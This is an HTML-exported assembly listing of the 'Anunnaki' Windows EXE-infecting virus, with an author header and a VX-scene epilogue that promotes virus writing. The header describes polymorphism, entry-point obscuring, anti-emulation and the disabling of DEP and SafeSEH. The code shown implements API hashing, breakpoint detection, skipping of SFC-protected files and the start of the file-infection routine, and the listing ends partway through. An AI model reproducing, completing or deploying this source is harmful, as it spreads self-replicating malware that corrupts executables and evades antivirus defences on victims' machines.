<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-----------------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;          _____                                     __   .__                             ;</span><span class="sc0">
</span><span class="sc1">;         /  _  \   ____  __ __  ____   ____ _____  |  | _|__|                            ;</span><span class="sc0">
</span><span class="sc1">;        /  /_\  \ /    \|  |  \/    \ /    \\__  \ |  |/ /  |                            ;</span><span class="sc0">
</span><span class="sc1">;       /    |    \   |  \  |  /   |  \   |  \/ __ \|    &lt;|  |                            ;</span><span class="sc0">
</span><span class="sc1">;       \____|__  /___|  /____/|___|  /___|  (____  /__|_ \__|                            ;</span><span class="sc0">
</span><span class="sc1">;               \/     \/           \/     \/     \/     \/                               ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Virus information                                                                       ;</span><span class="sc0">
</span><span class="sc1">;   Virus name       -   Anunnaki                                                         ;</span><span class="sc0">
</span><span class="sc1">;   Virus version    -   DA (1.00)                                                        ;     </span><span class="sc0">
</span><span class="sc1">;   Virus author     -   Prophet/EOF                                                      ;</span><span class="sc0">
</span><span class="sc1">;   Author contact   -   null                                                             ;</span><span class="sc0">
</span><span class="sc1">;   Virus type       -   Direct action infector infecting files in current directory      ;</span><span class="sc0">
</span><span class="sc1">;   Target files     -   Exe files                                                        ;             </span><span class="sc0">
</span><span class="sc1">;   Target OS        -   Win2k/2003/xp/vista/2008/win7                                    ;</span><span class="sc0">
</span><span class="sc1">;   Infection type   -   Appending last section                                           ;</span><span class="sc0">
</span><span class="sc1">;   Infection mark   -   No more epo patches can occur                                    ;</span><span class="sc0">
</span><span class="sc1">;   Polymorphic      -   OPE2 (Offensive polymorphic engine 2 by prophet/eof)             ;</span><span class="sc0">
</span><span class="sc1">;                    -   Sliding 32bit key (xor/add/sub)                                  ;</span><span class="sc0">
</span><span class="sc1">;   EPO              -   Patching ExitProcess/exit/_exit                                  ;</span><span class="sc0">
</span><span class="sc1">;                        with call rel32/call dword ptr [mem32]                           ;</span><span class="sc0">
</span><span class="sc1">;   Payload          -   Message box                                                      ;</span><span class="sc0">
</span><span class="sc1">;   Armoured         -   Anti-emulation(GetLastError,SSE)                                 ;</span><span class="sc0">
</span><span class="sc1">;                    -   Detect SW breakpoints                                            ;</span><span class="sc0">
</span><span class="sc1">;                        Check API ep's for bpx,that can stop even lame sanboxes          ;</span><span class="sc0">
</span><span class="sc1">;   Apis resolving   -   Using CRC                                                        ;</span><span class="sc0">
</span><span class="sc1">;   Other features   -   Not using Delta offset                                           ;</span><span class="sc0">
</span><span class="sc1">;                    -   Randomly abort infection                                         ;     </span><span class="sc0">
</span><span class="sc1">;                    -   Last section isnt(usually) set to writable (anti-herusticts)     ;</span><span class="sc0">
</span><span class="sc1">;                    -   Insert random bytes before and after virus body                  ;</span><span class="sc0">
</span><span class="sc1">;                    -   Using SEH to handle errors                                       ;</span><span class="sc0">
</span><span class="sc1">;                    -   Update or generate Checksum for infected file                    ;</span><span class="sc0">
</span><span class="sc1">;                    -   Due the trash-bytes and poly_layers ,size of virus is variable   ;</span><span class="sc0">
</span><span class="sc1">;   DEP support      -   Set Nx_Compatible flag in DLLCharacteristics to zero             ;  </span><span class="sc0">
</span><span class="sc1">;                        Im not 100% sure if this disable both SW/HW DEP                  ;</span><span class="sc0">
</span><span class="sc1">;   ASLR support     -   Implicit - neither virus nor decryptors are position dependant   ;</span><span class="sc0">
</span><span class="sc1">;   SafeSeh support  -   Disable SafeSEH and use custom SEH handlers                      ;</span><span class="sc0">
</span><span class="sc1">;                        Zero-out the LoadConfig table directory entry in optional header ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Greetz to EOF guys                                                                      ;     </span><span class="sc0">
</span><span class="sc1">;       izee      -  thank you for everything pal                                         ;</span><span class="sc0">
</span><span class="sc1">;       pr0mix    -  welcome to the team and thx for help                                 ;</span><span class="sc0">
</span><span class="sc1">;       fAMINE    -  thx for inspirational talks                                          ;     </span><span class="sc0">
</span><span class="sc1">;       berniee   -  wake up from ur hiatus man                                           ;</span><span class="sc0">
</span><span class="sc1">;       wargame   -  maybe we could contact each other finally                            ;</span><span class="sc0">
</span><span class="sc1">;       tanMa     -  alive ?                                                              ;</span><span class="sc0">
</span><span class="sc1">;       kaze/FAT  -  thx for indirect help :)                                             ;     </span><span class="sc0">
</span><span class="sc1">;       other pals ...                                                                    ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Additional info                                                                         ;</span><span class="sc0">
</span><span class="sc1">;       I have coded this virus for fun,and to learned alot.                              ;</span><span class="sc0">
</span><span class="sc1">;       Watch new releases at eof-project or vx.netlux.                                   ;</span><span class="sc0">
</span><span class="sc1">;       Poly engine used in virus will be released in near future as the version i        ;</span><span class="sc0">
</span><span class="sc1">;       used virus has restricted functionalities to avoid buggy decryptors.              ;</span><span class="sc0">
</span><span class="sc1">;       If you would like to contact me,ask izee for my contact information.              ;</span><span class="sc0">
</span><span class="sc1">;                                                                                         ;</span><span class="sc0">
</span><span class="sc1">; Epilogue                                                                                ;     </span><span class="sc0">
</span><span class="sc1">;       The 'death' of the scene was anounced by bad voices few years ago,                ;</span><span class="sc0">
</span><span class="sc1">;       yet, we are still here.                                                           ;</span><span class="sc0">
</span><span class="sc1">;                                                                                         ;</span><span class="sc0">
</span><span class="sc1">;       There are hundreds of ppl doing their vxing as the hobby,                         ;</span><span class="sc0">
</span><span class="sc1">;       academical research or as their jobs.                                             ;</span><span class="sc0">
</span><span class="sc1">;       VXing cannot die.                                                                 ; </span><span class="sc0">
</span><span class="sc1">;       VXing is an idea , ideas cannot die.                                              ;</span><span class="sc0">
</span><span class="sc1">;       With so many platforms,technologies developed every year,number                   ;</span><span class="sc0">
</span><span class="sc1">;       of potentional spreading channels is growing up.There will always be ppl          ;</span><span class="sc0">
</span><span class="sc1">;       who get an idea "how could i infect that,and spread over it".                     ;</span><span class="sc0">
</span><span class="sc1">;       Let's see what will future bring.                                                 ;</span><span class="sc0">
</span><span class="sc1">;                                                                                         ;</span><span class="sc0">
</span><span class="sc1">;   prophet/EOF 20.10.09                                                                  ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------------------; </span><span class="sc0">
</span><span class="sc1">; Read license before using this program                                                  ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------------------;</span><span class="sc0">
            </span><span class="sc2">.586</span><span class="sc0">
            </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">
    
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">macros.inc</span><span class="sc0">
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">windows.inc</span><span class="sc0"> 
            </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">anunnaki.inc</span><span class="sc0">

            </span><span class="sc5">VIRUS_SIZE</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc5">VIRUS_END</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0">   </span><span class="sc5">VIRUS_START</span><span class="sc0">
            </span><span class="sc5">VIRUS_MEM_ALLOC_SIZE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0"> 
            </span><span class="sc5">VIRUS_POLY_LAYERS_MAX</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> 
            </span><span class="sc5">VIRUS_TRASH_BYTES_MAX</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; ( minimal val 1 = no trash )</span><span class="sc0">
            </span><span class="sc5">VIRUS_POLY_LAYERS_MAX</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> 
            
            </span><span class="sc5">RANDOM_ABORT</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; randomly abort infection (comment out to disable)</span><span class="sc0">
            </span><span class="sc5">ABORT_CHANCE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; 1 out of 3 infections is aborted  </span><span class="sc0">
                
            </span><span class="sc5">VIRUS_STATE_MAKE_LAST_WRITABLE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> 
            
            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">vars</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                                VIRUS START                                  ;  </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;                         </span><span class="sc0">
</span><span class="sc5">VIRUS_START</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_ep</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                
            </span><span class="sc1">; setup SEH</span><span class="sc0">
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_exit</span><span class="sc4">&gt;</span><span class="sc0"> 
            
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">stopemul</span><span class="sc0"> </span><span class="sc1">; try to stop emulation </span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">sizeof</span><span class="sc0"> </span><span class="sc5">vars</span><span class="sc0"> </span><span class="sc1">; alloc space for vars </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">; use ebp as pointer to vars base </span><span class="sc0">
                
            </span><span class="sc1">; fill with zeores</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">sizeof</span><span class="sc0"> </span><span class="sc5">vars</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
                
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">antiemul2</span><span class="sc0"> </span><span class="sc1">; second attempt to stop emulation </span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.OrigVirusEntryVa</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    
            </span><span class="sc1">; avers can detect constants at stack during emulation </span><span class="sc0">
            </span><span class="sc1">; thats why i tryed to stop emulation before this part</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02B0B47A5h</span><span class="sc0">  </span><span class="sc1">; OutputDebugStringA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0A7FB4165h</span><span class="sc0">  </span><span class="sc1">; GetFileSize</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0251097CCh</span><span class="sc0">  </span><span class="sc1">; ExitProcess</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0391AB6AFh</span><span class="sc0">  </span><span class="sc1">; UnmapViewOfFile</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0A89B382Fh</span><span class="sc0">  </span><span class="sc1">; MapViewOfFile</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0B41B926Ch</span><span class="sc0">  </span><span class="sc1">; CreateFileMappingA ; problem </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0553B5C78h</span><span class="sc0">  </span><span class="sc1">; CreateFileA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0D82BF69Ah</span><span class="sc0">  </span><span class="sc1">; FindClose</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">075272948h</span><span class="sc0">  </span><span class="sc1">; FindNextFileA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C9EBD5CEh</span><span class="sc0">  </span><span class="sc1">; FindFirstFileA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">072F11E39h</span><span class="sc0">  </span><span class="sc1">; MultiByteToWideChar</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0334971B2h</span><span class="sc0">  </span><span class="sc1">; GetCurrentDirectoryW</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0B09315F4h</span><span class="sc0">  </span><span class="sc1">; CloseHandle</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">03FC1BD8Dh</span><span class="sc0">  </span><span class="sc1">; LoadLibraryA ; problem</span><span class="sc0">
                
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_kernel</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                
</span><span class="sc5">get_apis_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_apis_end</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressCrc</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">

            </span><span class="sc1">; api retrieve failed , cause exception</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                
            </span><span class="sc1">;  test if bpx was used at API</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">detect_bpx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_bpx</span><span class="sc0">
                
            </span><span class="sc1">; bpx was detected , fire SEH to exit virus</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">   
                
</span><span class="sc5">no_bpx</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_apis_loop</span><span class="sc0">
</span><span class="sc5">get_apis_end</span><span class="sc4">:</span><span class="sc0">                   
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                      get SFC support if available                           ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">check_sfc</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'so'</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'_cfs'</span><span class="sc0">  </span><span class="sc1">;Windows XP (forwarder chain from sfc.dll)</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aLoadLibrary</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">found_sfc</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'cfs'</span><span class="sc0">   </span><span class="sc1">;Windows Me/2000</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aLoadLibrary</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sfc1</span><span class="sc0">

</span><span class="sc5">found_sfc</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">03A793033h</span><span class="sc0"> </span><span class="sc1">; SfcIsFileProtected </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressCrc</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aSfcIsFileProtected</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">sfc1</span><span class="sc4">:</span><span class="sc0">               
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                               virus body                                    ;                                 </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;                         </span><span class="sc0">
            </span><span class="sc1">; init random_seed </span><span class="sc0">
            </span><span class="sc6">rdtsc</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.random_seed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchFiles</span><span class="sc0">
    
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0"> 
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                               virus exit                                    ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;normal exit                            </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.aExitProcess</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; seh exit                              </span><span class="sc0">
</span><span class="sc5">seh_exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0"> </span><span class="sc1">; restore SEH </span><span class="sc0">
                
            </span><span class="sc5">push_sz</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ExitProcess</span><span class="sc0">\</span><span class="sc2">000</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_kernel</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0"> 
                
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ExitProcess   </span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0"> 
                
</span><span class="sc1">; get ep to eax                                  </span><span class="sc0">
</span><span class="sc5">get_ep</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                            Infect File                                      ; </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;eax = filename</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; is sfc protected</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsSfcProtected</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">InfectFail</span><span class="sc0">  
        
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; map file with original size </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapFile</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectFail</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckFile</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectFailUnmap</span><span class="sc0">
            
            </span><span class="sc1">; randomly abort infection </span><span class="sc0">
</span><span class="sc9">ifdef</span><span class="sc0"> </span><span class="sc5">RANDOM_ABORT</span><span class="sc0">  
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ABORT_CHANCE</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectFailUnmap</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0"> </span><span class="sc1">; RANDOM_ABORT                            </span><span class="sc0">
                
</span><span class="sc5">IsPrepared</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrMappedImage</span><span class="sc0"> 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ebx = filename </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_3</span><span class="sc0">
                
</span><span class="sc5">InfectFailUnmap</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapFile</span><span class="sc0">
                
</span><span class="sc5">InfectFail</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0"> 
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                            check file                                     ; </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;__in  : eax = ptr mapped image </span><span class="sc0">
</span><span class="sc1">;__out : eax = 1 file is siutable </span><span class="sc0">
</span><span class="sc1">;        eax = 0 file isn't siutable for infection</span><span class="sc0">
</span><span class="sc5">CheckFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; is valid PE header ?</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0"> 
        
